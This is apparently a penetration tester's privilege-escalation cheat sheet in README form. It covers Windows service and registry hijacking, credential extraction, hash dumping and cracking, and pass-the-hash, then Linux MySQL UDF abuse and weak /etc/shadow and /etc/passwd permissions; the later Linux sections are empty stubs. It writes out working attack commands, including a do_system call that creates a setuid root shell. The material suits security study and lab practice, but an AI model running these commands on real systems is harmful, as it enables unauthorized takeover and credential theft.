# Privilege Escalation

### For Windows Privilege Escalation Related Binaries and Instructions: [link me]()

### For Linux Privilege Escalation Related Binaries and Instructions: [link me]()

# Windows Methodology

For a more detailed windows privilege escalation methodology: [Windows-PrivEsc-Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)

**Important windows privilege escalation related binaries:**
1. accesschk.exe 

  - downloadable link: `wget somewhere in misc/`
  - instructions: [link me](readme in misc/accesschk.exe)

### Services

***To query a service's configurations*** `sc qc <service-name>`

***To start or stop a service*** `net <start|stop> <service-name>`

1. Insecure service permissions
    - Description: if a user's permission is allowed to access and modify a service, such as SERVICE_CHANGE_CONFIG, we can change its binary path
    - Requirements: 
      - service must be running as LocalSystem 
      - SERVICE_CHANGE_CONFIG is within the permission of the user, or the group the user belongs to
      - ability to query the service configurations
      - ability to start and stop the service
    - Related instructions: 
      - accesschk parameters : `/accepteula -uvwqc` 
        - `c` is for service ACL check
      - sc command : `sc config <svc-name> binpath= "\"C:\path\to\service\binary\""` 
        - note the space between `=` and the binary path and the escaped quotes with `\`
      
2. Unquoted service paths
    - Description: if the binary to the service's path is not quoted and contain spaces, we can abuse Window's core functionality and create a binary in place that takes precedence. 
    - Requirements: 
       - service must be running as LocalSystem
       - ability to query service configurations
       - write access to **ANY** parent directories that happen after any spaces in the original binary path
       - ability to query the service configurations
       - ability to start and stop the service
    - Related instructions: 
       - accesschk parameters : `/accepteula -uvwqd` 
          - `d` is for directory ACL check
       
3.  Weak registry permissions
    - Description: if the service itself has a strong ACL, and we are unable to modify, if we have writable access to the service's registry entry, we can also change its binary path
    - Requirements: 
        - service must be running as LocalSystem 
        - write access to the service's registry entry under: `HKLM\SYSTEM\CurrentControlSet\services\servicename`
        - ability to query the service configurations
        - ability to start and stop the service
    - Related instructions: 
        - accesschk parameters : `/accepteula -uvwqk` 
          - `k` is for registry key ACL check
        - reg command : `reg add HKLM\SYSETM\CurrentControlSet\services\servicename /v ImagePath /t REG_EXPAND_SZ /d C:\Malicious\path /f`
          - `/v ImagePath`: specifies ImagePath registry entry
          - `/t REG_EXPAND_SZ` : specifies expanded string registry entry type
          - `/d C:\Malicious\path` : specifies the data we want to put inside the registry entry
          - `/f` : forces execution without user interaction/confirmation
          
4. Insecure service executable 
    - Description: If the service binary executable itself is writable by us, we can simply change that to point a malicious path
    - Requirements: 
        - service must be running as LocalSystem
        - write access to the service's executable
        - ability to query the service configurations
        - ability to start and stop the service
    - Related instructions: 
        - accesschk parameters : `/accepteula -uvwqh` 
          - `h` is for file or printer share ACL check
        - copy parameter : `/Y`
          - `/Y` for no confirmation (usually needed to replace any existing file)
          
        
### Registry
1. AutoRuns
    - Description: If any of the program's path in the autorun is writable, we can modify it. Once admin logs back on, the modified program should run as admin
    - Requirements: 
        - any of the autorun program's binary path needs to be writeble
        - must restart system
        - must have admin log on to trigger the autorun program's privlege as Administrator
    - Related instructions: 
        - accesschk parameters: `/accepteula -uvwqh`
          - `h` is for file ACL check
        - reg command: `req query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
          - `query` is for querying a registry key, note `add` was used to add registry value to a key
        - copy parameters: `/Y` for replacing existing file without user confirmation

2. AlwaysIntallElevated
    - Description : If the configuration for always installing software/applications as an elevated user is turned on for current user and local machine, we can install a malicious software as System
    - Requirements : 
        - **BOTH** HKLM and HKCU settings in AlwaysInstallElevated Key under SOFTWARE\Policies\Microsoft\Windows\Installer must be turned on `0x1`
    - Related instructions : 
        - reg commands: 
            - `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
            - `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` `/v` is the registry entry name under a specific key 

3. Passwords
    - Description: If the registry of winlogon in HKLM is readable, and if the Administrator had saved logon password in it, we pwn the admin account
    - Requirements: 
        - winlogon needs to have the admin user credentials
    - Related instructions: 
        - query all registry inside HKLM/HKCU hive for password: `reg query <HKCU|HKLM> /f password /t REG_SZ /s`
          - note that admin passwords should be stored inside `HKLM` unless current user is also admin
          - `/f` search pattern
          - `/t` type of registry value
          - `/s` query recursively
         - query specific autologon key: `reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"`

### Password Management
1. Registry : Please see the last entry of the Privesc methodology of Registry [Registry-passwords](https://github.com/0x5929/Sec/blob/main/PrivEsc/README#L101)
2. Saved Creds
    - Description: Some users, for the purpose of convenience, will save credentials inside `cmdkey`, then we may run commands as another user using the saved credentials using `runas /savedcred ...`
    - Requirements: 
      - credentials must be saved inside `cmdkey`
    - Related instructions: 
      - cmdkey command to retreive creds : `cmdkey /list`
      - runas command to run as another user: `runas /savedcred /user:admin C:\command\running\as\admin`
        - this assumes that the admin user had saved creds inside a smartcard and verfied by the `cmdkey /list` command
3. SAM & SYSTEM files
    - Description: 
        - SAM and SYSTEM files stores user credential hashes and their encryption keys respectively
        - if we can extract those files (usually from backup locations, since normally those files are locked) we can crack user credential hashes
        - backup locations we can look for : `C:\Windows\System32\config\RegBack` or `C:\Windows\repair`
    - Requirements: 
        - backup of SAM and SYSTEM files must be available and readable to be copied to a remote host for hash cracking 
    - Related instructions: 
        - extract hashes: `git clone https://github.com/Neohapsis/creddump7.git && apt install python-crypto && creddump7/pwdump.py SYSTEM SAM`
          - note that python2 is deprated and `apt install python-crypto` could cause issues if not already installed on testing machine
          - please google for a viable solution if that happens
        - finding hash methods : `hashcat -h | grep -i ntlm`
          - note that there could several hashing methods relating to ntlm, we want to crack a system/os hash here
        - cracking hashes : `hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt`
        - logging in with admin password (there are many ways to do this as well, ie runas, or via powershell credential obj): `winexe -U 'admin%pass' //MACHINE_IP cmd.exe`

4. PTH
    - Description: Once retrevied the hash from creddump7, we can just pass the hash to login instead of even cracking it
      - note that logging in with hash from a linux box can be done with : `pth-winexe`
      - logging in with the password from a linux box can be done with : `winexe` 
      - both will require SMB 445 to be open as winexe uses that for RCE and remote shell      
    - Requirements: 
      - SAM and SYSTEM files credential hashes to be dumped
    - Related instructions: 
      - logging with hash: `pth-winexe -U 'admin%hash' //MACHINE_IP cmd.exe`
        - note that the hash **must** be the full `LM:NTLM` hash


### Scheduled Tasks

- Description: If we are able to find a scheduled task that is running as admin/system priv, and if we can write or append to it, we can have our commands run elevated
    - to check for current user scheduled tasks (this will also include microsoft scheduled tasks running as current user) : `schtasks /query /fo LIST /v`
        - `/fo` is format output
        - `/v` is verbose mode
    - note that this is not the best way to enumerate scheduled tasks, and that there are no easy way to enumerate them
        - look for clues inside:  
            - interesting directories: `C:\` `C:\Users\user` `C:\Program Files` etc...
- Requirements: 
    - scheduled task time condition (is it possible to elevate with the time given?)
    - write or append access to the script running as scheduled task
    

### Applications and Programs

- Description: like scheduled tasks, look inside interesting directories, find unrecognize programs, and searchploit to see if they are vulnerable
- Requirements: 
    - the application needs to be running as administrator or system, check with: `tasklist \v | findstr <program-name>`
    - if its a gui app, we **have to** have RDP access or physical access to exploit this condition

### Token Abuse

***For more detailed explanation of all potato exploits:*** 
[potato exploits explanation](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)

- Descriptions : Service accounts by Windows core functionality can impersonate as other accounts in order to do service specific tasks, if we are exploiting a service and achieved RCE, we can impersonate admin's token to launch a separate processing using that token
- Requirements : 
    - must have `SeImpersonatePrivilege` on
    - must have SMB (Hot potato) or RPC (Juicy and Rogue) services on for exploits. 
    
    
# Linux Methodology 


### Service Exploits
- Description: If a service is running as root, `ps -ef | grep root` and is vulnerable to exploits, we can get root simply by exploiting the service
    - *ie* Exploiting mysql service: if we can obtain admin/root credentials, and mysql is running `root` instead of `mysql`, we can apply User Defined Functions to run system commands
        - in order to get UDF, we need to upload a shared-object file to a specific folder that mysql looks when executing UDFs
            - The share object file needs to be compiled, its source contains the `system()` call
        - then we need to execute the following command using the UDF function inside a mysql instance that is running as root
            - `cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash`
        - next, exit out of mysql, and execute the bash with preserved privlege `/tmp/rootbash -p`
        
```
# compiling the share object file for UDF
# note the -fPIC flag is necessary for x64 systems

gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

```
# mysql commands to create the UDF
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';

```


- Requirement: 
    - service must be running as root
    - must have root access to the service aka able to login using: `mysql -uroot`
    
- Related instructions: 
    - once the UDF is created, we can execute system commands using: `select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');`
        - note that do_system is the UDF function name created in mysql, and the shared object file is used for this function execution

### Weak File Permissions

1. Readable `/etc/shadow`
    - Description: if the `/etc/shadow` file has insecure permissions, if we can read it, we can extract root hash to crack it
    - Requirements: 
        - `/etc/shadow` must be readable by the low priv user
        
    - Related instructions: 
        - to crack hash using john (note hashcat can do the same as well) `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
          - note, using hashcat would have been : `hashcat -m 1800 --force <hash> <wordlist>`
          
2. Writable `/etc/shadow`
    - Description: if the `/etc/shadow` file is writable, we can just replace the root hash with another password hash that we can create
        - note that for `/etc/shadow` most likely needs a a specific hashed format for this to work
        - using `mkpasswd` would work, remember to hash it using the sha512 
    - Requirements: 
        - `/etc/shadow` must be writable
        - `/etc/shadow` must be readable (preferred because we can extract and also verify hash method of the original `/etc/shadow` file
    - Related instructions: 
        - make a new password hash using mkpasswd: `mkpasswd -m sha-512 newpasswordhere`
       
3. Writable `/etc/passwd`
    - Description: `/etc/passwd` file takes precedence for password auth because of backward compatibility, if we can write to it, we can replace root password, or create a new root account
    - Requirements: 
        - 
    - Related instructions: 
    
### Sudo


### SUID/GUID


### Cronjobs


### Password & Keys


### NFS


### Kernel Exploits

